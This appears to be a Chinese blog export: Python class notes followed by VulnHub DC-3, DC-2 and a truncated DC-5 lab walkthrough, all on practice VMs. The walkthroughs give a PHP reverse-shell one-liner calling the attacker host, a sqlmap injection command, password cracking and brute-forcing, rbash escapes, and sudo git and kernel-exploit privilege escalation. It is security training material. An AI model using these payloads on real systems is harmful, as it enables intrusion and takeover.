<li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li>
<li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li>
<li><strong>数据成员：</strong>类变量或者实例变量用于处理类及其实例对象的相关的数据。</li>
<li><strong>方法重载：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重载。</li>
<li><strong>实例变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li>
<li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个 Dog 类型的对象派生自 Animal 类，这是模拟”是一个（is-a）”关系（例：Dog 是一个 Animal）。</li>
<li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li>
<li><strong>方法：</strong>类中定义的函数。</li>
<li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li>
</ul>
<h2 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h2><p>使用 class 语句来创建一个新类，class 之后为类的名称并以冒号结尾，如：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">people</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">""</span>
    age <span class="token operator">=</span> <span class="token number">0</span>
    \_\_weight <span class="token operator">=</span> <span class="token number">0</span>		<span class="token comment"># 两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。</span>
    
    <span class="token keyword">def</span> \_\_init\_\_<span class="token punctuation">(</span>self<span class="token punctuation">,</span> n<span class="token punctuation">,</span> a<span class="token punctuation">,</span> w<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>name <span class="token operator">=</span> n
        self<span class="token punctuation">.</span>age <span class="token operator">=</span> a
        self<span class="token punctuation">.</span>\_\_weight <span class="token operator">=</span> w
   
	<span class="token keyword">def</span> \_\_secretFunction<span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>		<span class="token comment"># 两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"you can't read me"</span><span class="token punctuation">)</span>
    
    <span class="token keyword">def</span> <span class="token function">speak</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%s say: I'm %d years old."</span><span class="token operator">%</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>name<span class="token punctuation">,</span> self<span class="token punctuation">.</span>age<span class="token punctuation">)</span><span class="token punctuation">)</span>

p <span class="token operator">=</span> people<span class="token punctuation">(</span><span class="token string">"nayst"</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>speak<span class="token punctuation">(</span><span class="token punctuation">)</span>		<span class="token comment"># nayst say: I'm 10 years old.</span></code></pre>

<p>除 self 参数外，还包含 3 个参数，且这 3 个参数没有设置默认参数，因此在实例化类对象时，需要传入相应的 n ，a ，w 值（self 参数是特殊参数，不需要手动传值，Python 会自动传给它值）。</p>
<p>无论是类属性还是类方法，对于类来说，它们都不是必需的，可以有也可以没有。</p>
<h2 id="self"><a href="#self" class="headerlink" title="self"></a>self</h2><p>类的方法中必须有首个参数<code>self</code>，这里的 <code>self</code> 指向类的实例，而非类（self.class 指向类）。</p>
<p>类似于 PHP 中的 <code>this</code>。</p>
<h2 id="类的专有方法"><a href="#类的专有方法" class="headerlink" title="类的专有方法"></a>类的专有方法</h2><p>专有方法开头和结尾各有 2 个下划线，且中间不能有空格。</p>
<ul>
<li><strong>__init__ :</strong> 构造函数，在生成对象时调用</li>
<li><strong>__del__ :</strong> 析构函数，释放对象时使用</li>
<li><strong>__repr__ :</strong> 打印，转换</li>
<li><strong>__setitem__ :</strong> 按照索引赋值</li>
<li><strong>__getitem__:</strong> 按照索引获取值</li>
<li><strong>__len__:</strong> 获得长度</li>
<li><strong>__cmp__:</strong> 比较运算</li>
<li><strong>__call__:</strong> 函数调用</li>
<li><strong>__add__:</strong> 加运算</li>
<li><strong>__sub__:</strong> 减运算</li>
<li><strong>__mul__:</strong> 乘运算</li>
<li><strong>__truediv__:</strong> 除运算</li>
<li><strong>__mod__:</strong> 求余运算</li>
<li><strong>__pow__:</strong> 乘方</li>
</ul>
]]></content>
      <categories>
        <category>语法</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-3</title>
    <url>/2022/04/09/VulnHub-DC-3/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。</p>
<p>靶机：192.168.254.131（<a href="https://www.vulnhub.com/entry/dc-32,312/">DC-3</a>）</p>
<p>攻击机：192.168.254.128（Kali）</p>
<p>物理机：192.168.254.1（Windows10）</p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><p>先扫描靶机IP及开启的服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sn <span class="token number">192.168</span>.254.1/24</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407183225720.png" class="" title="image-20220407183225720" loading="lazy">

<p>进一步扫描靶机开启的服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sV -p- <span class="token number">192.168</span>.254.131</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407183255285.png" class="" title="image-20220407183255285" loading="lazy">

<p>目标靶机80端口存在httpd服务。</p>
<h2 id="查看网站相关信息"><a href="#查看网站相关信息" class="headerlink" title="查看网站相关信息"></a>查看网站相关信息</h2><p>打开站点，一个登录界面，使用插件<code>wappalyzer</code>查看网站的相关信息。</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407183420439.png" class="" title="image-20220407183420439" loading="lazy">

<p>可以看到该网站使用CMS为<code>Joomla</code>。</p>
<h1 id="漏洞扫描及利用"><a href="#漏洞扫描及利用" class="headerlink" title="漏洞扫描及利用"></a>漏洞扫描及利用</h1><h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>在漏洞库中查询 Joomla 漏洞，首先查询版本。</p>
<p>获取版本号可以用joomla的专用扫描器 <code>joomscan</code>来扫描</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ joomscan -u <span class="token number">192.168</span>.254.131</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407184554357.png" class="" title="image-20220407184554357" loading="lazy">

<p>查询该版本的漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ searchsploit joomla <span class="token number">3.7</span>.0</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407184805436.png" class="" title="image-20220407184805436" loading="lazy">

<p>发现该版本存在SQL注入漏洞和跨站脚本漏洞。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>查看SQL注入的信息，先复制到当前文件夹</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ searchsploit -m <span class="token number">42033</span>.txt
$ <span class="token function">cat</span> <span class="token number">42033</span>.txt</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407184958715.png" class="" title="image-20220407184958715" loading="lazy">

<p>这个文件里面都把利用命令给出来了，直接复制粘贴，然后修改一下IP地址即可使用。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.254.131/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml"</span> --risk<span class="token operator">=</span><span class="token number">3</span> --level<span class="token operator">=</span><span class="token number">5</span> --random-agent --dbs -p list<span class="token punctuation">[</span>fullordering<span class="token punctuation">]</span></code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407185216267.png" class="" title="image-20220407185216267" loading="lazy">

<p>测试可用，一把嗦。</p>
<p>库：<code>Joomla</code></p>
<p>表：<code>#__users</code></p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407185854214.png" class="" title="image-20220407185854214" loading="lazy">

<p>得到管理员密码。</p>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h2><p>拿到的管理员密码是密文，尝试用约翰开膛手破解。</p>
<p>把密文保存到文件中，开始破译。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu'</span> <span class="token operator">></span> pass.txt
$ john pass.txt</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407201240425.png" class="" title="image-20220407201240425" loading="lazy">

<p>拿到密码：snoopy，成功登录后台。</p>
<blockquote>
<p>通过修改模块中的php文件，插入一句话木马，然后通过中国菜刀或weevely连接获取shell的方法。</p>
</blockquote>
<p>写一个反弹shell的木马。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php system<span class="token punctuation">(</span><span class="token string">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 192.168.254.128 1234 >/tmp/f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">></span></code></pre>

<p>上传木马</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407203244703.png" class="" title="image-20220407203244703" loading="lazy">

<p>随便选择一个模板</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407203441928.png" class="" title="image-20220407203441928" loading="lazy">

<p>新建文件</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407203504799.png" class="" title="image-20220407203504799" loading="lazy">

<p>选择文件名和文件类型</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407203532117.png" class="" title="image-20220407203532117" loading="lazy">

<p>将刚刚写的马复制过来，保存</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407211946282.png" class="" title="image-20220407211946282" loading="lazy">

<p>监听1234端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ rlwrap <span class="token function">nc</span> -lvnp <span class="token number">1234</span></code></pre>

<p>访问木马，执行代码，成功反弹shell！</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407212035963.png" class="" title="image-20220407212035963" loading="lazy">

<p>接下来就是提权了。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407204825629.png" class="" title="image-20220407204825629" loading="lazy">

<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> -l</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407204915535.png" class="" title="image-20220407204915535" loading="lazy">

<p>经过查找没有发现s权限的文件也没有发现可以用root权限执行的命令。</p>
<p>这种情况还是需要用searchsploit来查找提权漏洞。但是查找前需要知道系统的版本号和内核版本号。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /etc/issue	<span class="token comment">#查看系统版本号</span>
$ <span class="token function">uname</span> -a 			<span class="token comment">#查看内核版本号</span></code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407205101911.png" class="" title="image-20220407205101911" loading="lazy">

<p>得知系统为 <code>ubuntu 16.04</code>，内核发行版本为 <code>4.4.0-21</code>。</p>
<p>查找相关漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ searchsploit ubuntu <span class="token number">16.04</span></code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407205242393.png" class="" title="image-20220407205242393" loading="lazy">

<p>发现三个对应内核版本的漏洞。</p>
<p>三个都行，这里选择39772，复制payload后打开。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ searchsploit -m <span class="token number">39773</span>.txt</code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407205743565.png" class="" title="image-20220407205743565" loading="lazy">

<p>根据地址下载 zip 文件，解压后发现两个文件，将<code>exploit.tar</code>上传到靶机上，解压执行。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ :file_upload2web exploit.tar		<span class="token comment">#上传文件到靶机</span>
$ <span class="token function">tar</span> -xvf exploit.tar  			<span class="token comment">#解压exploit提权脚本tar包</span>
$ <span class="token builtin class-name">cd</span> ebpf_mapfd_doubleput_exploit	
$ ./compile.sh   					<span class="token comment">#执行脚本，编译文件</span>
$ ./doubleput  						<span class="token comment">#执行提权文件</span></code></pre>

<img src="/2022/04/09/VulnHub-DC-3/image-20220407212348514.png" class="" title="image-20220407212348514" loading="lazy">

<p>成功拿到flag</p>
<img src="/2022/04/09/VulnHub-DC-3/image-20220407212425364.png" class="" title="image-20220407212425364" loading="lazy">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="学到的知识"><a href="#学到的知识" class="headerlink" title="学到的知识"></a>学到的知识</h2><ol>
<li>searchsploit 查询漏洞。</li>
<li>约翰开膛手爆破加密后的密码。</li>
<li>利用 linux 内核漏洞提权。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/rpsate/article/details/119682569?spm=1001.2014.3001.5502">vulnhub DC3 靶场练习</a></p>
<p><a href="https://blog.csdn.net/weixin_43583637/article/details/101554815">Vulnhub靶机实战——DC-3</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-2</title>
    <url>/2022/04/08/VulnHub-DC-2/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。</p>
<p>靶机：192.168.254.130（<a href="https://www.vulnhub.com/entry/dc-1,292/">DC-2</a>）</p>
<p>攻击机：192.168.254.128（Kali）</p>
<p>物理机：192.168.254.1（Windows10）</p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><p>先扫描靶机IP及开启的服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sn <span class="token number">192.168</span>.254.1/24</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407115515671.png" class="" title="image-20220407115515671" loading="lazy">

<p>进一步扫描靶机开启的服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap -sV -p- <span class="token number">192.168</span>.254.130</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407115636681.png" class="" title="image-20220407115636681" loading="lazy">

<p>目标靶机80端口存在httpd服务，ssh服务的端口改到了7744。</p>
<h2 id="查看网站相关信息"><a href="#查看网站相关信息" class="headerlink" title="查看网站相关信息"></a>查看网站相关信息</h2><p>尝试打开站点，失败。</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407120904208.png" class="" title="image-20220407120904208" loading="lazy">

<p>可以看到IP被成功解析成域名，但无法建立连接，由此可以得出是域名解析出了问题，域名没有被DNS服务器成功解析。</p>
<blockquote>
<p>域名解析的流程是：</p>
<ol>
<li>首先浏览器会读取缓存中是否有指定域名对应的IP，如果有则解析结束。</li>
<li>如果缓存中没有读到指定域名，则在hosts文件中寻找有无指定的域名信息，如果有则解析结束。</li>
<li>如果hosts中没有则访问DNS服务器，在DNS服务器中寻找域名对应的IP。</li>
</ol>
</blockquote>
<p>因此可以手动解析，在hosts文件中加入dc-2对应的IP地址。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">vim</span> /etc/hosts</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407121750354.png" class="" title="image-20220407121750354" loading="lazy">

<p>再次刷新页面就可以正常打开了。</p>
<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>使用 <a href="https://www.freebuf.com/articles/network/190128.html">cewl</a> 爬取信息。</p>
<p>用 wpscan 来获取该网站上的用户名信息。</p>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>成功登录后台！</p>
<h1 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h1><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>打开网站，在主页拿到<code>flag1</code>！</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407140602902.png" class="" title="image-20220407140602902" loading="lazy">

<blockquote>
<p>Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.</p>
<p>More passwords is always better, but sometimes you just can’t win them all.</p>
<p>Log in as one to see the next flag.</p>
<p>If you can’t find it, log in as another.</p>
</blockquote>
<p>提示使用<a href="https://www.freebuf.com/articles/network/190128.html">cewl</a>爬取信息。</p>
<h2 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h2><pre class="language-bash" data-language="bash"><code class="language-bash">$ cewl http://dc-2/ -m <span class="token number">3</span> -d <span class="token number">3</span> -e -v -w wppass.txt

-m 最小单词长度
-d：爬网深度
-e：收集包含email地址信息
-v：Verbose模式，该模式下，Cewl会导出目标网站的详细数据
-w：保存字典文件</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407141132507.png" class="" title="image-20220407141132507" loading="lazy">

<p>生成字典成功，下面我们就获取该网站上的用户名。 通过网页底部的文字 Proudly powered by WordPress得知该网站是 WordPress搭建而成。</p>
<p>有一款工具 <a href="https://zhuanlan.zhihu.com/p/149725645">wpscan</a> 是专门针对 WordPress的渗透工具，下面我们就用wpscan来获取该网站上的用户名信息。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ wpscan --url dc-2 -e u -P wppass.txt

-e: 枚举 u表示枚举用户
-P: 爆破密码字典路径</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407143929254.png" class="" title="image-20220407143929254" loading="lazy">

<p>得到两个账户</p>
<blockquote>
<p>Username: jerry, Password: adipiscing<br>Username: tom, Password: parturient</p>
</blockquote>
<p>使用<strong>jerry</strong>账户成功登录后台，拿到<code>flag2</code>！</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407144628391.png" class="" title="image-20220407144628391" loading="lazy">

<blockquote>
<p>If you can’t exploit WordPress and take a shortcut, there is another way.</p>
<p>Hope you found another entry point.</p>
</blockquote>
<p>翻译：如果你不能利用WordPress走捷径，还有另一种方法，希望你发现另一个入口</p>
<p>结合之前扫到的ssh服务，可以联想到尝试ssh登录getshell。</p>
<h2 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h2><p>利用tom账户成功连接shell。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">ssh</span> tom@dc-2 -p <span class="token number">7744</span></code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407145413174.png" class="" title="image-20220407145413174" loading="lazy">

<p>在目录下发现<code>flag4.txt</code>，但是<code>rbash</code>没有读取文件的命令，经尝试可以使用vi编辑器打开。</p>
<blockquote>
<p>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.</p>
</blockquote>
<p>翻译：可怜的老汤姆总是在追逐杰瑞。也许他应该为他造成的所有压力而起诉。</p>
<p>没啥用。。。</p>
<h2 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h2><p>尝试登录另一个账户jerry，结果权限不够。</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407150024201.png" class="" title="image-20220407150024201" loading="lazy">

<p>看来要从tom账户入手，提权。</p>
<p>第一步就是绕过<a href="http://kuanghy.github.io/2017/02/20/rbash">rbash</a>，因为 rbash 是受限制的 bash ，这个 shell 会在某些功能上受限制：</p>
<ul>
<li>不能使用cd命令（意味着不能更改目录）</li>
<li>不能设置或取消环境变量：SHELL， PATH， ENV， BASH_ENV</li>
<li>导入功能受限</li>
<li>指定包含参数’&#x2F;‘或’-‘的文件名(即命名中不能包含 ‘&#x2F; ‘ 或’-‘)</li>
<li>不能使用使用 <code>&gt;，&gt;|， &lt;&gt;， &gt;&amp;， &amp;&gt;， &gt;&gt;</code> 等重定向操作符</li>
<li>不能使用’set + r’或’set + o’关闭</li>
</ul>
<p>因为rbash中执行的命令不能带 &#x2F;，所以不能直接执行 &#x2F;bin&#x2F;bash。</p>
<ol>
<li><p>rbash逃逸-方法一</p>
<blockquote>
<p>vi 中有个命令shell可以调用bash，但是该系统中shell默认是指向rbash的，所以我们要通过set使其指向 &#x2F;bin&#x2F;bash，然后执行shell调用 &#x2F;bin&#x2F;bash，这样就绕过了rbash。</p>
</blockquote>
<p>进入vi，命令模式中输入：</p>
<pre class="language-none"><code class="language-none">:set shell&#x3D;&#x2F;bin&#x2F;bash
:shell</code></pre>

<p>成功切换bash！</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407153313945.png" class="" title="image-20220407153313945" loading="lazy">
</li>
<li><p>rbash逃逸-方法二</p>
<blockquote>
<p>在bash的内部有一个bash表，这个bash表中有 命令-&gt;命令文件路径这样的键值对。</p>
<p>BASH_CMDS是bash的一个内置数组，该数组下标对应命令，值对应命令文件路径。</p>
<p>当我们将&#x2F;bin&#x2F;bash赋值给BASH_CMDS[A]是，那么 A就是一条命令，执行A命令就等于执行了 &#x2F;bin&#x2F;bash。</p>
<p>所以当你执行A命令是，rbash发现其中没有 &#x2F;，所以就会顺利的执行。</p>
</blockquote>
<p>同理我们也可以指定 <code>ls</code>，<code>whoami</code>等系统命令。当你执行 <code>BASH_CMDS[ls]=/usr/bin/whoami</code>是，你再执行 <code>ls</code>，你会惊奇的发现命令行出现的是用户名，而不是陈列出目录。但是要注意的是BASH_CMDS只能改变外部命令的对应关系，对内置命令是无能为力的。</p>
<p>输入以下命令：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/bash
$ a</code></pre>

<p>成功切换bash！</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407160426596.png" class="" title="image-20220407160426596" loading="lazy"></li>
</ol>
<p>但是，在调用bash后只能使用简单的内置命令，更多比较复杂的外部命令是在 &#x2F;tmp和 &#x2F;usr&#x2F;tmp 这两个文件夹中的。</p>
<p>此时需要指定环境变量。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/bin:/usr/bin:<span class="token environment constant">$PATH</span></code></pre>

<blockquote>
<p>指定 &#x2F;tmp和 &#x2F;usr&#x2F;tmp 为环境变量后，bash就自动在这两个目录里中寻找外部命令，而不用将命令的绝对路径写出来。</p>
<p>例如：我需要执行whoami命令，不设置环境变量需要输入 &#x2F;usr&#x2F;bin&#x2F;whoami才能执行，设置环境变量后输入 whoami即可。</p>
<p><strong>所以这条命令只是让执行命令更方便一点。</strong></p>
</blockquote>
<p>成功切换jerry用户，在目录下发现<code>flag4</code>。</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407160904915.png" class="" title="image-20220407160904915" loading="lazy">

<blockquote>
<p>Good to see that you’ve made it this far - but you’re not home yet.</p>
<p>You still need to get the final flag (the only flag that really counts!!!).</p>
<p>No hints here - you’re on your own now. :-)</p>
<p>Go on - git outta here!!!!</p>
</blockquote>
<p>翻译：很高兴看到你已经做到了这一点 - 但你还不在home。您仍然需要获得最终标志（唯一真正重要的标志!!!）。 这里没有提示 - 你现在独自一人。 :-)继续 - git outta在这里!!!!</p>
<p>提示<code>git</code></p>
<h2 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h2><p>最后一步应该是提权到root了，先查看可以以root执行的命令。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407161605694.png" class="" title="image-20220407161605694" loading="lazy">

<p>查看当前账户的权限。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> -l</code></pre>

<img src="/2022/04/08/VulnHub-DC-2/image-20220407164853130.png" class="" title="image-20220407164853130" loading="lazy">

<p>可以看到当前用户（jerry）以 root 权限使用<code>git</code>时免密。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config</code></pre>

<blockquote>
<p>这条命令是查看关于配置文件的帮助文档，在查看文档的时候可以执行shell命令，用法与vi，more，less等命令类似。</p>
</blockquote>
<pre class="language-none"><code class="language-none">!&#x2F;bin&#x2F;bash</code></pre>

<p>成功切换到root用户！</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407165158155.png" class="" title="image-20220407165158155" loading="lazy">

<p>在root目录下拿到最后的flag</p>
<img src="/2022/04/08/VulnHub-DC-2/image-20220407165234445.png" class="" title="image-20220407165234445" loading="lazy">

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><h2 id="学到的知识"><a href="#学到的知识" class="headerlink" title="学到的知识"></a>学到的知识</h2><ol>
<li>修改hosts文件。</li>
<li><a href="https://www.freebuf.com/articles/network/190128.html">cewl</a> 爬取应用所使用的单词列表。</li>
<li><a href="https://zhuanlan.zhihu.com/p/149725645">wpscan</a> 扫描网站后台。</li>
<li><a href="https://xz.aliyun.com/t/7642">rbash 逃逸</a>。</li>
<li><a href="https://www.cnblogs.com/pingzhe/p/7077685.html">linux 中的内置命令和外部命令</a>。</li>
<li>git 提权。</li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/rpsate/article/details/119641205?spm=1001.2014.3001.5502">vulnhub DC2 靶场练习</a></p>
<p><a href="https://www.extrader.top/posts/ce8eed56/">VulnHub-DC-2靶场练习</a></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnHub-DC-5</title>
    <url>/2022/04/20/VulnHub-DC-5/</url>
    <content><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>在VMware中搭建环境，网络选择NAT或者桥接，确保攻击机和靶机在同一网络下即可，我这里选择的NAT。</p>
<p>靶机：192.168.254.134（<a href="https://www.vulnhub.com/entry/dc-5,314/">DC-5</a>）</p>
<p>攻击机：192.168.254.128（Kali）</p>
<p>物理机：192.168.254.1（Windows10）</p>
<h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><p><code>nmap</code>扫描靶机</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220420170303776.png" class="" title="image-20220420170303776" loading="lazy">

<p>成功扫描到目标靶机，开放了两个端口。</p>
<p>80端口存在http服务。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421133647164.png" class="" title="image-20220421133647164" loading="lazy">

<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><p>无框架等信息，只知道由Nginx反向代理，先扫目录。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220420170159039.png" class="" title="image-20220420170159039" loading="lazy">

<p>未发现隐藏目录，只能从页面下手了。</p>
<p><code>contact.php</code>页面存在提交，可能存在注入。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421133940967.png" class="" title="image-20220421133940967" loading="lazy">

<p>尝试后发现无注入，但是提交后的页面页脚一直在变，可能存在文件包含。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421134021953.png" class="" title="image-20220421134021953" loading="lazy">

<p>经测试，存在隐藏字段<code>file</code>可以包含文件。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421134124451.png" class="" title="image-20220421134124451" loading="lazy">

<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>尝试伪协议写文件，失败。</p>
<p>已知中间件为<code>nginx</code>，尝试读取日志文件。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421134340815.png" class="" title="image-20220421134340815" loading="lazy">

<p>成功读取日志文件，写入木马。</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421134527981.png" class="" title="image-20220421134527981" loading="lazy">

<p>成功执行！</p>
<img src="/2022/04/20/VulnHub-DC-5/image-20220421134845639.png" class="" title="image-20220421134845639" loading="lazy">

<p>反弹shell！</p>
<p>在 <code>Kali</code> 上监听 <code>1234</code> 端口。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">nc</span> -lvnp <span class="token number">1234</span></code></pre>

<p>在靶机上反弹shell。</p>
